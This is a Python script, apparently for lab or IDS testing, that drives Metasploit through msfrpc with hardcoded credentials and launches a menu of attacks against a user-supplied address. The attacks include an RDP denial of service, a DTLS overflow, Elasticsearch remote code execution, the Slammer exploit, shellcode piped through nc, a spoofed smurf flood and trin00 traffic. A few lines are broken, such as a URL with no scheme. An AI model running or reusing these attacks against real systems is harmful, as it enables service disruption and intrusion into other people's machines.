#!/usr/bin/python2.7

"""
*
* Practical Test Script 
* @daniel lichtblau
*	
"""

import ipaddress
import sys
import time
import os
import subprocess
import urllib2
from scapy.all import *



try:
	import msfrpc
except ImportError:
	try:  
		os.system("clear")
		print("Installing msfrpc module...")
		os.system("git clone git://github.com/SpiderLabs/msfrpc.git msfrpc")
		os.system("cd msfrpc/python-msfrpc")
		os.system("python setup.py install")
		import msfrpc
	except:
		print("Offline")
		if os.path.exists('msfrpc/python-msfrpc/setup.py'):
			os.system("python msfrpc/python-msfrpc/setup.py install")
		try:
			import msfrpc
		except:
			print("ERROR: Module Not detected")
			exit()


#http://www.hackingarticles.in/perform-dos-attack-metasploitable-3/
#os.system("msfconsole load msgrpc Pass=abc123")

def start_msf():
	subprocess.call('gnome-terminal -x msfconsole -r /tmp/setup.rc', shell=True)
	#subprocess.call(['gnome-terminal', '-x', 'msfconsole -r /tmp/setup.rc'])
	
	os.system("clear")
	print("Starting Services")
	# Progress Bar
	toolbar_width = 40

	# setup toolbar
	sys.stdout.write("[%s]" % (" " * toolbar_width))
	sys.stdout.flush()
	sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['
	
	for i in xrange(toolbar_width):
		time.sleep(0.2) 
		sys.stdout.write("-")
		sys.stdout.flush()
	
	sys.stdout.write("\n")

# Check if process has been started previously using subprocess (stackoverflow) # *
p = subprocess.Popen(["ps", "-aux"], stdout=subprocess.PIPE)					# *
out, err = p.communicate()														# *
if ('ruby /usr/bin/msfconsole -r /tmp/setup.rc' in str(out)):					# *
    print('msfconsole running...')
else:
	if os.path.exists('/tmp/setup.rc'):
		start_msf()
	else:
		setupRC = "db_connect msf:msf123@127.0.0.1/msf\nload msgrpc User=msf Pass='abc123'"
		with open('/tmp/setup.rc','w') as f:
			f.write(setupRC)
		start_msf()


try:
	client = msfrpc.Msfrpc({})
	client.login('msf','abc123')
except:
	print("ERROR: msfconsole not started...")
	print("")
	print("	 To start msfconsole manually: ")
	print("	 0. Open new terminal")
	print("	 1. msfconsole")
	print("	 2. load msgrpc Pass=abc123")
	exit()


os.system("clear")
## Main Functions
while True:
	attack_Dst = raw_input("Client Address: ")
	try:
		ipaddress.ip_address(bytearray(attack_Dst))
		break
	except ValueError:
		print("Invalid Address")


print("Select your attack")
print("1. DoS")
print("2. TLS DoS")
print("3. Exploit")
print("4. Linux Shellcode")
print("5. DNS Cache Poison")
print("6. WebPHP Attack")
print("7. Slammer Worm")
print("8. Smurf attack")
print("9: Trin00")
print("10. NmapICMP")
print("11. Bad Traffic")
print("12. ZeroTTL")

select = input("Selection: ")

def DoS():
    os.system("clear")
    ## Exploit found at: http://www.hackingarticles.in/perform-dos-attack-metasploitable-3/


    ## Example @ https://gist.github.com/carnal0wnage/5f5f64432738fc25c538
    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RPORT 3389\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "exploit\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']



# Possible DoS with tls and fragmentation 
def DoS2():
    os.system("clear")
    print("DoS2 Test...")


    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use auxiliary/dos/ssl/dtls_fragment_overflow\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "run\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']



def Exploit():
    os.system("clear")
    print("Exploit Test...")


    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use exploit/multi/elasticsearch/script_mvel_rce\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "exploit\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']

def Lin_Shellcode():
	print("Executing shellcode...")
	os.system("perl -e 'print \"\\x90\\x90\\x90\\xE8\\xC0\\xFF\\xFF\\xFF/bin/sh\"' | nc 192.168.20.2 80")

def cache_poison():
	print("Executing Cache poison")
	os.system("perl -e 'print \"\x057sir7\x03com\"' | nc -u 192.168.20.2 53")

def Webphp_atck():
	urllib2.urlopen("192.168.20.2/Setup.php").read()

def slammer():
    print("Executing Slammer Worm")

    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use exploit/windows/mssql/ms02_039_slammer\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "exploit\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']

def smurf():
	print("Running Smurf Attack with hping3... ctrl^C to exit...")
	os.system("hping3 -1 --flood -a 192.168.20.2 192.168.20.255")

def trin00():
	os.system("echo \"l44adsl\" | nc -u 192.168.20.2 27444")

def nmapICMP():
	os.system("nmap -sn -PE 192.168.20.2")

def badtraffic():
	print("sending to port 0")
	os.system("echo \"Bad Traffic\" | nc 192.168.20.2 0")

def zeroTTL():
    print("sending ping with TTL 0")
    spoofed_packet = IP(src='192.168.20.100', dst='192.168.20.2', ttl=0)/ICMP()
    send(spoofed_packet)



#def one():
#    return "one"

tokenDict = {
	1:DoS,
	2:DoS2,
	3:Exploit,
	4:Lin_Shellcode,
	5:cache_poison,
	6:Webphp_atck,
	7:slammer,
	8:smurf,
	9:trin00,
	10:nmapICMP,
	11:badtraffic,
	12:zeroTTL
}


functionToCall = tokenDict[select]

functionToCall()
